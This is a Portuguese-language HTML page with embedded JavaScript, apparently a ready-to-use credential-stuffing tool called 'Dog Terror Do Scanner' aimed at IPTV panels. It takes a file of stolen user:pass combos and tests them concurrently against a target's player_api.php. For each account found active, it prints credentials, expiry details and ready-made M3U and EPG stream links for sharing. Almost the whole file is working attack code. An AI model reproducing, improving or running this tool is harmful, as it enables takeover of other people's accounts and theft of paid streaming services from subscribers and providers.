<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dog Terror Do Scanner</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap');
        
:root {
    --primary-blue: #00f0ff;
    --secondary-blue: #00cfff;
    --dark-bg: #0a0a15;
    --card-bg: #111122;
    --text-color: #00ffff;
    --glow: 0 0 12px rgba(0, 255, 255, 0.7);
}
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inconsolata', monospace;
        }
        
            body {
            background-color: var(--dark-bg);
            color: var(--text-color);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
            padding: 20px;
        }
        
        /* Efeito Matrix de fundo */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(10, 10, 10, 0.9), rgba(10, 10, 10, 0.9)), 
            url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><text x="10" y="20" font-family="monospace" font-size="12" fill="%23ff000020">0</text><text x="30" y="35" font-family="monospace" font-size="12" fill="%2300ff4120">1</text><text x="50" y="50" font-family="monospace" font-size="12" fill="%2300ff4120">0</text><text x="70" y="65" font-family="monospace" font-size="12" fill="%2300ff4120">1</text><text x="90" y="80" font-family="monospace" font-size="12" fill="%2300ff4120">0</text></svg>');
            opacity: 0.1;
            z-index: -1;
            animation: matrixAnimation 50s linear infinite;
        }
        
        @keyframes matrixAnimation {
            0% { background-position: 0 0; }
            100% { background-position: 0 1000px; }
        }
        
        /* Gradiente animado */
        .gradient-border {
            position: relative;
            padding: 2px;
            border-radius: 5px;
            .gradient-border {
            background: linear-gradient(90deg, #800000, #ff0000, #ff4d4d, #800000);
            background-size: 300% 100%;
            animation: gradientAnimation 8s ease infinite;
        }
        
        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: var(--card-bg);
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        
        h1 {
            text-align: center;
            margin-bottom: 20px;
            color: var(--matrix-green);
            text-shadow: var(--matrix-shadow);
            font-size: 2.5rem;
            position: relative;
            animation: typing 3s steps(30, end);
            overflow: hidden;
            white-space: nowrap;
        }
        
        @keyframes typing {
            from { width: 0; }
            to { width: 100%; }
        }
        
        .panel {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .input-group {
            flex: 1;
            min-width: 250px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: var(--matrix-green);
            text-shadow: var(--matrix-shadow);
            font-weight: bold;
        }
        
        input, select, textarea, button {
            width: 100%;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--matrix-green);
            color: var(--matrix-green);
            border-radius: 4px;
            margin-bottom: 15px;
            transition: all 0.3s;
            outline: none;
        }
        
        input:focus, select:focus, textarea:focus {
            border-color: var(--matrix-cyan);
            box-shadow: 0 0 10px var(--matrix-aqua);
        }
        
        /* Efeito Glitch nas bordas */
        input, select, textarea, button {
            animation: glitch-border 5s infinite linear;
        }
        
        @keyframes glitch-border {
            0%, 100% { border-color: var(--matrix-green); }
            25% { border-color: var(--matrix-cyan); }
            50% { border-color: black; }
            75% { border-color: var(--matrix-aqua); }
        }
        
        button {
            background: linear-gradient(to right, #00f0ff, #00cfff);
            color: #000;
            font-weight: bold;
            cursor: pointer;
            border: none;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
        }
        
        button:hover {
            background: linear-gradient(to right, #33ffff, #00ffff);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.5);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        button:disabled {
            background: #555;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .progress-container {
            width: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 20px;
            background: linear-gradient(to bottom, #00f0ff, #33ffff);
            width: 0%;
            border-radius: 4px;
            transition: width 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .progress-bar::after {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, 
                rgba(255, 255, 255, 0) 0%, 
                rgba(255, 255, 255, 0.3) 50%, 
                rgba(255, 255, 255, 0) 100%);
            animation: progressShine 2s infinite;
        }
        
        @keyframes progressShine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-box {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border-radius: 4px;
            border-left: 3px solid var(--primary-blue);
            transition: all 0.3s;
        }
        
        .stat-box:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.2);
            border-left-color: var(--matrix-cyan);
        }
        
        .stat-title {
            font-size: 0.9rem;
            color: var(--matrix-aqua);
            margin-bottom: 5px;
        }
        
        .stat-value {
            font-size: 1.2rem;
            font-weight: bold;
            color: var(--matrix-green);
        }
        
        .results {
            margin-top: 30px;
        }
        
        .results-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .hits-container {
            max-height: 500px;
            overflow-y: auto;
            padding-right: 10px;
        }
        
        /* Scrollbar customizada */
        .hits-container::-webkit-scrollbar {
            width: 8px;
        }
        
        .hits-container::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
        }
        
        .hits-container::-webkit-scrollbar-thumb {
            background: linear-gradient(var(--matrix-green), var(--matrix-cyan));
            border-radius: 10px;
        }
        
        .hit {
            background-color: rgba(0, 0, 0, 0.5);
            border-left: 3px solid var(--matrix-green);
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 4px;
            position: relative;
            font-family: monospace;
            white-space: pre;
            color: var(--matrix-green);
            line-height: 1.6;
            animation: fadeIn 0.5s ease-in;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .hit-copy {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0, 255, 65, 0.2);
            border: 1px solid var(--primary-blue);
            color: var(--primary-blue);
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.3s;
        }
        
        .hit-copy:hover {
            background: rgba(0, 255, 65, 0.4);
        }
        
        .hit-copy.copied {
            background: rgba(0, 255, 65, 0.6);
            color: black;
        }
        
        /* Responsividade */
        @media (max-width: 768px) {
            .panel {
                flex-direction: column;
            }
            
            .input-group {
                width: 100%;
            }
            
            .stats {
                grid-template-columns: 1fr 1fr;
            }
            
            h1 {
                font-size: 1.8rem;
            }
        }
        
        @media (max-width: 480px) {
            .stats {
                grid-template-columns: 1fr;
            }
            
            body {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="gradient-border">
        <div class="container">
            <h1>DOG TERROR DO SCANNER</h1>
            
            <div class="panel">
                <div class="input-group">
                    <label for="host">Host do Painel (com/sem http):</label>
                    <input type="text" id="host" placeholder="Ex: painel.iptv.com ou http://painel.iptv.com">
                </div>
                
                <div class="input-group">
                    <label for="concurrency">Controle de Concorr√™ncia (1-100 bots):</label>
                    <input type="number" id="concurrency" min="1" max="100" value="10">
                </div>
            </div>
            
            <div class="input-group">
                <label for="file">Carregue arquivo .txt com combos (user:pass):</label>
                <input type="file" id="file" accept=".txt">
            </div>
            
            <div class="panel">
                <button id="startBtn">INICIAR SCAN</button>
                <button id="stopBtn" disabled>PARAR</button>
                <button id="clearBtn">LIMPAR</button>
            </div>
            
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-title">HITS</div>
                    <div class="stat-value" id="hitsCount">0</div>
                </div>
                <div class="stat-box">
                    <div class="stat-title">ERROS</div>
                    <div class="stat-value" id="errorsCount">0</div>
                </div>
                <div class="stat-box">
                    <div class="stat-title">BOTS ATIVOS</div>
                    <div class="stat-value" id="activeBots">0</div>
                </div>
                <div class="stat-box">
                    <div class="stat-title">VELOCIDADE</div>
                    <div class="stat-value" id="speed">0/s</div>
                </div>
                <div class="stat-box">
                    <div class="stat-title">TESTADOS</div>
                    <div class="stat-value" id="testedCount">0</div>
                </div>
                <div class="stat-box">
                    <div class="stat-title">RESTANTES</div>
                    <div class="stat-value" id="remainingCount">0</div>
                </div>
            </div>
            
            <div class="results">
                <div class="results-header">
                    <h2>HITS ENCONTRADOS</h2>
                    <button id="copyAllBtn">COPIAR TODOS</button>
                </div>
                <div class="hits-container" id="hitsContainer"></div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Elementos do DOM
            const hostInput = document.getElementById('host');
            const concurrencyInput = document.getElementById('concurrency');
            const fileInput = document.getElementById('file');
            const startBtn = document.getElementById('startBtn');
            const stopBtn = document.getElementById('stopBtn');
            const clearBtn = document.getElementById('clearBtn');
            const progressBar = document.getElementById('progressBar');
            const hitsCount = document.getElementById('hitsCount');
            const errorsCount = document.getElementById('errorsCount');
            const activeBots = document.getElementById('activeBots');
            const speed = document.getElementById('speed');
            const testedCount = document.getElementById('testedCount');
            const remainingCount = document.getElementById('remainingCount');
            const hitsContainer = document.getElementById('hitsContainer');
            const copyAllBtn = document.getElementById('copyAllBtn');
            
            // Vari√°veis de estado
            let isScanning = false;
            let totalCombos = 0;
            let testedCombos = 0;
            let hits = 0;
            let errors = 0;
            let activeWorkers = 0;
            let lastSpeedUpdate = 0;
            let combosSinceLastUpdate = 0;
            let speedInterval;
            let queue = [];
            let currentWorkers = [];
            
            // Event Listeners
            fileInput.addEventListener('change', handleFileUpload);
            startBtn.addEventListener('click', startScan);
            stopBtn.addEventListener('click', stopScan);
            clearBtn.addEventListener('click', clearAll);
            copyAllBtn.addEventListener('click', copyAllHits);
            
            // Fun√ß√µes
            function handleFileUpload(event) {
                const file = event.target.files[0];
                if (!file) return;
                
                const reader = new FileReader();
                reader.onload = function(e) {
                    // Processar o arquivo diretamente sem usar a textarea
                    const combosText = e.target.result.trim();
                    const combos = combosText.split('\n')
                        .map(line => line.trim())
                        .filter(line => line.includes(':'));
                    
                    if (combos.length > 0) {
                        queue = [...combos];
                        totalCombos = combos.length;
                        updateStats();
                        addMessageToResults(`Arquivo carregado com ${combos.length} combos`);
                    } else {
                        alert('Nenhum combo v√°lido encontrado no arquivo (formato user:pass)');
                    }
                };
                reader.readAsText(file);
            }
            
            function startScan() {
                if (isScanning) return;
                
                const host = hostInput.value.trim();
                const concurrency = parseInt(concurrencyInput.value);
                
                if (!host) {
                    alert('Por favor, insira um host v√°lido');
                    return;
                }
                
                if (isNaN(concurrency) || concurrency < 1 || concurrency > 100) {
                    alert('Concorr√™ncia deve ser entre 1 e 100');
                    return;
                }
                
                if (queue.length === 0) {
                    alert('Por favor, carregue um arquivo com combos antes de iniciar');
                    return;
                }
                
                testedCombos = 0;
                hits = 0;
                errors = 0;
                
                updateStats();
                progressBar.style.width = '0%';
                hitsContainer.innerHTML = '';
                
                isScanning = true;
                startBtn.disabled = true;
                stopBtn.disabled = false;
                
                // Iniciar workers
                currentWorkers = [];
                for (let i = 0; i < concurrency; i++) {
                    currentWorkers.push(setTimeout(() => processQueue(host), i * 100));
                }
                
                // Iniciar monitoramento de velocidade
                lastSpeedUpdate = Date.now();
                combosSinceLastUpdate = 0;
                speedInterval = setInterval(updateSpeed, 1000);
            }
            
            function stopScan() {
                if (!isScanning) return;
                
                isScanning = false;
                startBtn.disabled = false;
                stopBtn.disabled = true;
                
                // Parar todos os workers
                currentWorkers.forEach(timeoutId => clearTimeout(timeoutId));
                currentWorkers = [];
                
                // Parar monitoramento de velocidade
                clearInterval(speedInterval);
                
                addMessageToResults('Scan parado pelo usu√°rio');
            }
            
            function clearAll() {
                stopScan();
                hostInput.value = '';
                concurrencyInput.value = '10';
                fileInput.value = '';
                hitsContainer.innerHTML = '';
                progressBar.style.width = '0%';
                
                totalCombos = 0;
                testedCombos = 0;
                hits = 0;
                errors = 0;
                activeWorkers = 0;
                queue = [];
                
                updateStats();
            }
            
            async function processQueue(host) {
                if (!isScanning || queue.length === 0) {
                    activeWorkers--;
                    updateStats();
                    
                    // Verificar se todos os workers terminaram
                    if (activeWorkers === 0 && isScanning) {
                        stopScan();
                        addMessageToResults('Scan completo! Todos os combos foram testados.');
                    }
                    return;
                }
                
                activeWorkers++;
                updateStats();
                
                const combo = queue.shift();
                const [username, password] = combo.split(':');
                
                try {
                    const result = await testCombo(host, username, password);
                    
                    if (result && result.status === 'active') {
                        hits++;
                        displayHit(result, combo);
                    } else {
                        errors++;
                    }
                } catch (error) {
                    errors++;
                    console.error('Erro ao testar combo:', error);
                }
                
                testedCombos++;
                combosSinceLastUpdate++;
                
                // Atualizar progresso
                const progress = (testedCombos / totalCombos) * 100;
                progressBar.style.width = `${progress}%`;
                
                updateStats();
                
                // Processar pr√≥ximo item na fila
                currentWorkers.push(setTimeout(() => processQueue(host)));
            }
            
            async function testCombo(host, username, password) {
                // Adicionar http:// se n√£o estiver presente
                let formattedHost = host.startsWith('http') ? host : `http://${host}`;
                
                // Remover barras finais
                formattedHost = formattedHost.replace(/\/+$/, '');
                
                const url = `${formattedHost}/player_api.php?username=${username}&password=${password}`;
                
                try {
                    const response = await fetchWithTimeout(url, { timeout: 10000 });
                    
                    if (!response.ok) {
                        throw new Error(`HTTP error! status: ${response.status}`);
                    }
                    
                    const data = await response.json();
                    
                    // Verificar se a conta est√° ativa
                    if (data.user_info && data.user_info.status === 'Active') {
                        return {
                            status: 'active',
                            username: username,
                            password: password,
                            message: 'Conta ativa encontrada!',
                            userInfo: data.user_info,
                            serverInfo: data.server_info,
                            host: formattedHost
                        };
                    }
                    
                    return null;
                } catch (error) {
                    throw error;
                }
            }
            
            function fetchWithTimeout(url, options = {}) {
                const { timeout = 5000 } = options;
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                return fetch(url, {
                    ...options,
                    signal: controller.signal
                }).then(response => {
                    clearTimeout(timeoutId);
                    return response;
                }).catch(error => {
                    clearTimeout(timeoutId);
                    throw error;
                });
            }
            
            function displayHit(result, combo) {
                const now = new Date();
                const scanDate = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
                
                const createdDate = new Date(result.userInfo.created_at * 1000).toLocaleDateString();
                const expiryDate = new Date(result.userInfo.exp_date * 1000).toLocaleDateString();
                
                // Formatar links M3U e EPG
                const m3uLink = `${result.host}/get.php?username=${result.username}&password=${result.password}&type=m3u_plus`;
                const epgLink = `${result.host}/xmltv.php?username=${result.username}&password=${result.password}`;
                
                // Formatar a mensagem de hit no estilo solicitado
                const hitMessage = `
‚ï≠‚îÄ‚û°Ô∏è DOG TERROR DO SCANNER
‚îú‚óèüì©MENSAGEM DO SERVIDOR: ‚ñ∫ ${result.message}
‚ïü‚úÖSTATUS: ‚ñ∫ ${result.userInfo.status}
‚ïüüîéDIA DO SCAN: ‚ñ∫ ${scanDate}
‚ïü‚úÖSEU PLANO: ‚ñ∫ ${result.userInfo.package || 'PACOTE COMPLETO'}
‚ïüüíÅUSUARIO: ‚ñ∫ ${result.username}
‚ïüüîêSENHA: ‚ñ∫ ${result.password}
‚ïüüìÖCRIADO EM: ‚ñ∫ ${createdDate}
‚ïüüìÜEXPIRA EM: ‚ñ∫ ${expiryDate}
‚ïüüôãCON.MAX: ‚ñ∫ ${result.userInfo.max_connections}
‚ïüüëÄCON.ATIVAS: ‚ñ∫ ${result.userInfo.active_cons}
‚ïüüåçHOST: ‚ñ∫ ${new URL(result.host).origin}
‚ïüüìéPORTA: ‚ñ∫ ${result.serverInfo.port || '80'}
‚ïüüìéLINK M3U: ‚ñ∫ ${m3uLink}
‚ïüüìéLINK EPG: ‚ñ∫ ${epgLink}
‚ï∞‚îÄ‚û°Ô∏è Hits Por: DOG TERROR DO SCANNER
                `;
                
                const hitElement = document.createElement('div');
                hitElement.className = 'hit';
                hitElement.innerHTML = hitMessage.replace(/\n/g, '<br>');
                hitElement.dataset.rawText = hitMessage; // Armazenar o texto formatado original
                
                const copyButton = document.createElement('button');
                copyButton.className = 'hit-copy';
                copyButton.textContent = 'COPIAR';
                copyButton.addEventListener('click', function() {
                    copyToClipboard(hitMessage);
                    copyButton.textContent = 'COPIADO!';
                    copyButton.classList.add('copied');
                    setTimeout(() => {
                        copyButton.textContent = 'COPIAR';
                        copyButton.classList.remove('copied');
                    }, 2000);
                });
                
                hitElement.appendChild(copyButton);
                hitsContainer.prepend(hitElement);
            }
            
            function addMessageToResults(message) {
                const messageElement = document.createElement('div');
                messageElement.className = 'hit';
                const formattedMessage = `‚ï≠‚îÄ‚û°Ô∏è DOG SCANNER<br>‚îú‚óèüì©MENSAGEM: ‚ñ∫ ${message}<br>‚ï∞‚îÄ‚û°Ô∏è ${new Date().toLocaleString()}`;
                messageElement.innerHTML = formattedMessage;
                messageElement.dataset.rawText = `‚ï≠‚îÄ‚û°Ô∏è DOG SCANNER\n‚îú‚óèüì©MENSAGEM: ‚ñ∫ ${message}\n‚ï∞‚îÄ‚û°Ô∏è ${new Date().toLocaleString()}`;
                hitsContainer.prepend(messageElement);
            }
            
            function updateStats() {
                hitsCount.textContent = hits;
                errorsCount.textContent = errors;
                activeBots.textContent = activeWorkers;
                testedCount.textContent = testedCombos;
                remainingCount.textContent = totalCombos - testedCombos;
            }
            
            function updateSpeed() {
                const now = Date.now();
                const elapsedSeconds = (now - lastSpeedUpdate) / 1000;
                const currentSpeed = elapsedSeconds > 0 ? Math.round(combosSinceLastUpdate / elapsedSeconds) : 0;
                
                speed.textContent = `${currentSpeed}/s`;
                
                lastSpeedUpdate = now;
                combosSinceLastUpdate = 0;
            }
            
            function copyToClipboard(text) {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
            }
            
            function copyAllHits() {
                const hits = Array.from(document.querySelectorAll('.hit'))
                    .map(hit => hit.dataset.rawText) // Usar o texto formatado original
                    .join('\n\n');
                
                if (hits) {
                    copyToClipboard(hits);
                    copyAllBtn.textContent = 'TODOS COPIADOS!';
                    setTimeout(() => {
                        copyAllBtn.textContent = 'COPIAR TODOS';
                    }, 2000);
                }
            }
        });
    </script>
</body>
